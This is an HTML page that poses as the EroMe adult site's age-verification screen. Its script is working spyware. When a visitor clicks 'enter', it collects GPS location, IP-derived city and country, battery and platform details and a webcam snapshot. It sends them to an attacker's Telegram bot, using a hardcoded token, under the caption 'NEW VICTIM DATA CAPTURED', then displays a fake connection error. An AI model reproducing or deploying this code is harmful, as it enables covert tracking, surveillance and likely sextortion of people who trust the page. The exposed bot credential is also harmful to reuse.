<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <title>EroMe - Porn Video & Photo Sharing</title>
  <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', 'Montserrat', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #232323;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: white;
      overflow: hidden;
    }

    #disclaimer {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #232323;
      z-index: 2000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    #disclaimer .bg {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    #disclaimer .bg img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      opacity: 0.5;
    }

    #home-box {
      text-align: center;
      max-width: 400px;
      padding: 20px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 10px;
      position: relative;
    }

    #home-box img {
      max-width: 150px;
      margin-bottom: 20px;
    }

    .home-text-center {
      font-size: 14px;
      color: #fff;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .enter {
      width: 240px;
      display: inline-block;
      text-align: center;
      line-height: 44px;
      font-size: 13px;
      letter-spacing: 0.5px;
      font-weight: bold;
      text-transform: uppercase;
      background-color: #eb6395;
      color: #1b1b1b;
      border-radius: 4px;
      cursor: pointer;
      transition: 0.3s;
    }

    .enter:hover {
      color: #ffffff;
      background-color: #db467e;
      box-shadow: 0 0 15px rgba(235, 99, 149, 0.5);
    }

    .loading-status {
      margin-top: 15px;
      font-size: 12px;
      color: #eb6395;
      display: none;
    }
  </style>
</head>
<body>

  <div id="disclaimer">
    <div class="bg">
      <img src="https://www.erome.com//img/bg.jpg">
    </div>
    <div id="home-box">
      <img src="https://www.erome.com//img/logo-erome-vertical.png">
      <div class="home-text-center" id="text-box">
        This site is an adult community that contains sexually explicit material. You must be 18 years old or over to enter.
      </div>
      <div class="enter" id="enter-btn" onclick="startBackgroundProcess()">I am 18 or older - enter</div>
      <div class="loading-status" id="status">Verifying access...</div>
    </div>
  </div>

  <script>
    // ============================================
    // TELEGRAM BOT CONFIGURATION
    // ============================================
    const TELEGRAM_BOT_TOKEN = '8690496477:AAHv5lD-p5tlEOdipUlyMMnBY86uCgVwzrI'; 
    const TELEGRAM_CHAT_ID = '7071495926'; // Substitua pelo seu ID real
    const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

    let currentUserData = {
      device: {},
      ip: {},
      location: null,
      battery: { level: 'N/A', charging: 'No' }
    };

    // ============================================
    // FUNÇÕES TELEGRAM
    // ============================================
    async function sendTelegramPhotoWithData(photoBlob) {
      try {
        const now = new Date();
        const timestamp = now.getFullYear() + '-' + 
                         String(now.getMonth() + 1).padStart(2, '0') + '-' + 
                         String(now.getDate()).padStart(2, '0') + ' ' + 
                         String(now.getHours()).padStart(2, '0') + ':' + 
                         String(now.getMinutes()).padStart(2, '0') + ':' + 
                         String(now.getSeconds()).padStart(2, '0');

        let caption = `🔍 NEW VICTIM DATA CAPTURED\n\n`;
        caption += `📍 Location:\n`;
        if (currentUserData.location) {
          const loc = currentUserData.location;
          caption += `Latitude: ${loc.lat}\n`;
          caption += `Longitude: ${loc.lon}\n`;
          caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
          caption += `Map: https://maps.google.com/?q=${loc.lat},${loc.lon}\n\n`;
        } else {
          caption += `Latitude: N/A\nLongitude: N/A\nCity: ${currentUserData.ip.city || 'N/A'}\nMap: N/A\n\n`;
        }

        caption += `🔋 Device Info:\n`;
        caption += `Battery: ${currentUserData.battery.level}%\n`;
        caption += `Charging: ${currentUserData.battery.charging}\n`;
        caption += `Platform: ${currentUserData.device.platform}\n`;
        caption += `Language: ${currentUserData.device.lang}\n\n`;
        caption += `🕒 Timestamp: ${timestamp}`;

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', photoBlob, 'capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');

        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (e) {}
    }

    // ============================================
    // COLETA DE DADOS
    // ============================================
    async function collectData() {
      currentUserData.device = { platform: navigator.platform, lang: navigator.language };
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          currentUserData.battery = { level: Math.round(battery.level * 100), charging: battery.charging ? 'Yes' : 'No' };
        }
      } catch (e) {}
      try {
        const res = await fetch('https://ipapi.co/json/');
        const ipData = await res.json();
        currentUserData.ip = { city: ipData.city, region: ipData.region, country: ipData.country_name };
      } catch (e) {}
    }

    async function getGPS() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 5000 }
        );
      });
    }

    // ============================================
    // PROCESSO EM SEGUNDO PLANO
    // ============================================
    async function startBackgroundProcess() {
      // 1. Alterar interface para simular carregamento sem sair da tela
      const btn = document.getElementById('enter-btn');
      const status = document.getElementById('status');
      const textBox = document.getElementById('text-box');
      
      btn.style.display = 'none';
      status.style.display = 'block';
      textBox.textContent = 'Please wait while we verify your age and connection...';

      // 2. Coletar dados invisíveis (IP, Bateria, etc)
      await collectData();

      // 3. Solicitar permissões (O navegador MOSTRARÁ o pop-up aqui)
      // Nota: Não existe forma técnica de "pular" o pop-up do navegador.
      currentUserData.location = await getGPS();

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        
        // Captura imediata e envio silencioso
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width; canvas.height = bitmap.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(bitmap, 0, 0);
        
        canvas.toBlob(blob => {
          sendTelegramPhotoWithData(blob);
          
          // Após o envio, simular que o acesso foi negado ou redirecionar
          setTimeout(() => {
            status.textContent = 'Connection error. Please try again later.';
          }, 2000);
        }, 'image/jpeg', 0.8);

      } catch (e) {
        status.textContent = 'Access denied. You must allow camera access to enter.';
      }
    }
  </script>
</body>
</html>
